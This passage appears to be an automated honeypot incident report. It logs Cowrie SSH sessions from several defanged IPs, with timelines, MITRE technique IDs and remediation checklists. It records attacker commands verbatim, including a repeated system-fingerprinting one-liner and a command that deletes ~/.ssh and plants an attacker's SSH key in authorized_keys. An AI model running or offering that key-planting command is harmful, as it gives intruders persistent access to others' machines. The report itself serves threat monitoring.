| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 16:58:32` | `cowrie.session.connect` |
| `2026-08-29 16:58:32` | `cowrie.client.version` |
| `2026-08-29 16:58:32` | `cowrie.client.kex` |
| `2026-08-29 16:58:32` | `cowrie.login.success` |
| `2026-08-29 16:58:33` | `cowrie.session.params` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.success` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.command.input` |
| `2026-08-29 16:58:33` | `cowrie.log.closed` |
| `2026-08-29 16:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0da53d5e02

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:00 |
| **Last Seen** | 2026-08-29 17:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:00:20` | `cowrie.session.connect` |
| `2026-08-29 17:00:20` | `cowrie.client.version` |
| `2026-08-29 17:00:20` | `cowrie.client.kex` |
| `2026-08-29 17:00:21` | `cowrie.login.success` |
| `2026-08-29 17:00:22` | `cowrie.session.params` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.success` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.command.input` |
| `2026-08-29 17:00:22` | `cowrie.log.closed` |
| `2026-08-29 17:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b84daa70234

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:01 |
| **Last Seen** | 2026-08-29 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:01:53` | `cowrie.session.connect` |
| `2026-08-29 17:01:53` | `cowrie.client.version` |
| `2026-08-29 17:01:53` | `cowrie.client.kex` |
| `2026-08-29 17:01:54` | `cowrie.login.success` |
| `2026-08-29 17:01:54` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:01:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:01:55` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ccaafa67768

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:02 |
| **Last Seen** | 2026-08-29 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:02:13` | `cowrie.session.connect` |
| `2026-08-29 17:02:13` | `cowrie.client.version` |
| `2026-08-29 17:02:13` | `cowrie.client.kex` |
| `2026-08-29 17:02:14` | `cowrie.login.success` |
| `2026-08-29 17:02:15` | `cowrie.session.params` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.success` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.command.input` |
| `2026-08-29 17:02:15` | `cowrie.log.closed` |
| `2026-08-29 17:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447b9d60f7b0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:04 |
| **Last Seen** | 2026-08-29 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:04:14` | `cowrie.session.connect` |
| `2026-08-29 17:04:14` | `cowrie.client.version` |
| `2026-08-29 17:04:15` | `cowrie.client.kex` |
| `2026-08-29 17:04:15` | `cowrie.login.success` |
| `2026-08-29 17:04:16` | `cowrie.session.params` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.success` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.command.input` |
| `2026-08-29 17:04:16` | `cowrie.log.closed` |
| `2026-08-29 17:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3f544f7f66

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:04 |
| **Last Seen** | 2026-08-29 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:04:51` | `cowrie.session.connect` |
| `2026-08-29 17:04:51` | `cowrie.client.version` |
| `2026-08-29 17:04:51` | `cowrie.client.kex` |
| `2026-08-29 17:04:52` | `cowrie.login.success` |
| `2026-08-29 17:04:52` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:04:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:04:52` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c225b450780

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:06 |
| **Last Seen** | 2026-08-29 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:06:21` | `cowrie.session.connect` |
| `2026-08-29 17:06:21` | `cowrie.client.version` |
| `2026-08-29 17:06:21` | `cowrie.client.kex` |
| `2026-08-29 17:06:21` | `cowrie.login.success` |
| `2026-08-29 17:06:22` | `cowrie.session.params` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.success` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.command.input` |
| `2026-08-29 17:06:22` | `cowrie.log.closed` |
| `2026-08-29 17:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f01edfa592d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:08 |
| **Last Seen** | 2026-08-29 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:08:35` | `cowrie.session.connect` |
| `2026-08-29 17:08:35` | `cowrie.client.version` |
| `2026-08-29 17:08:35` | `cowrie.client.kex` |
| `2026-08-29 17:08:36` | `cowrie.login.success` |
| `2026-08-29 17:08:36` | `cowrie.session.params` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.success` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:36` | `cowrie.command.input` |
| `2026-08-29 17:08:37` | `cowrie.log.closed` |
| `2026-08-29 17:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cce21f56011e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:10 |
| **Last Seen** | 2026-08-29 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:10:35` | `cowrie.session.connect` |
| `2026-08-29 17:10:35` | `cowrie.client.version` |
| `2026-08-29 17:10:36` | `cowrie.client.kex` |
| `2026-08-29 17:10:36` | `cowrie.login.success` |
| `2026-08-29 17:10:37` | `cowrie.session.params` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.success` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:37` | `cowrie.command.input` |
| `2026-08-29 17:10:38` | `cowrie.log.closed` |
| `2026-08-29 17:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb47396e4604

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 17:11 |
| **Last Seen** | 2026-08-29 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:11:13` | `cowrie.session.connect` |
| `2026-08-29 17:11:13` | `cowrie.client.version` |
| `2026-08-29 17:11:13` | `cowrie.client.kex` |
| `2026-08-29 17:11:14` | `cowrie.login.success` |
| `2026-08-29 17:11:14` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:11:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 17:11:14` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efef8dab9e9

| Field | Detail |
|---|---|
| **Source IP** | `97.74.87[.]152` |
| **First Seen** | 2026-08-29 17:11 |
| **Last Seen** | 2026-08-29 17:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:11:32` | `cowrie.session.connect` |
| `2026-08-29 17:11:32` | `cowrie.client.version` |
| `2026-08-29 17:11:32` | `cowrie.client.kex` |
| `2026-08-29 17:11:33` | `cowrie.login.success` |
| `2026-08-29 17:11:34` | `cowrie.session.params` |
| `2026-08-29 17:11:34` | `cowrie.command.input` |
| `2026-08-29 17:11:34` | `cowrie.command.failed` |
| `2026-08-29 17:11:35` | `cowrie.log.closed` |
| `2026-08-29 17:11:36` | `cowrie.session.params` |
| `2026-08-29 17:11:36` | `cowrie.command.input` |
| `2026-08-29 17:11:36` | `cowrie.session.file_download` |
| `2026-08-29 17:11:36` | `cowrie.log.closed` |
| `2026-08-29 17:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.87[.]152` to AbuseIPDB if not already reported
- [ ] Block `97.74.87[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0dd545f672

| Field | Detail |
|---|---|
| **Source IP** | `97.74.87[.]152` |
| **First Seen** | 2026-08-29 17:11 |
| **Last Seen** | 2026-08-29 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:11:36` | `cowrie.session.connect` |
| `2026-08-29 17:11:36` | `cowrie.client.version` |
| `2026-08-29 17:11:36` | `cowrie.client.kex` |
| `2026-08-29 17:11:37` | `cowrie.login.success` |
| `2026-08-29 17:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.87[.]152` to AbuseIPDB if not already reported
- [ ] Block `97.74.87[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-960e308f44b6

| Field | Detail |
|---|---|
| **Source IP** | `97.74.87[.]152` |
| **First Seen** | 2026-08-29 17:11 |
| **Last Seen** | 2026-08-29 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:11:38` | `cowrie.session.connect` |
| `2026-08-29 17:11:38` | `cowrie.client.version` |
| `2026-08-29 17:11:38` | `cowrie.client.kex` |
| `2026-08-29 17:11:39` | `cowrie.login.success` |
| `2026-08-29 17:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.87[.]152` to AbuseIPDB if not already reported
- [ ] Block `97.74.87[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-627bebb1c1cf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 17:12 |
| **Last Seen** | 2026-08-29 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:12:29` | `cowrie.session.connect` |
| `2026-08-29 17:12:29` | `cowrie.client.version` |
| `2026-08-29 17:12:29` | `cowrie.client.kex` |
| `2026-08-29 17:12:29` | `cowrie.login.success` |
| `2026-08-29 17:12:30` | `cowrie.session.params` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.success` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.command.input` |
| `2026-08-29 17:12:30` | `cowrie.log.closed` |
| `2026-08-29 17:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9539b91041

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 17:12 |
| **Last Seen** | 2026-08-29 17:13 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:12:49` | `cowrie.session.connect` |
| `2026-08-29 17:12:49` | `cowrie.client.version` |
| `2026-08-29 17:12:50` | `cowrie.client.kex` |
| `2026-08-29 17:12:50` | `cowrie.login.success` |
| `2026-08-29 17:12:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 17:12:51` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 17:12:51` | `cowrie.direct-tcpip.data` |
| `2026-08-29 17:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db34a89126b1

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-08-29 17:13 |
| **Last Seen** | 2026-08-29 17:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 17:13:35` | `cowrie.session.connect` |
| `2026-08-29 17:13:36` | `cowrie.client.version` |
| `2026-08-29 17:13:36` | `cowrie.client.kex` |
| `2026-08-29 17:13:38` | `cowrie.login.success` |
| `2026-08-29 17:13:39` | `cowrie.direct-tcpip.request` |
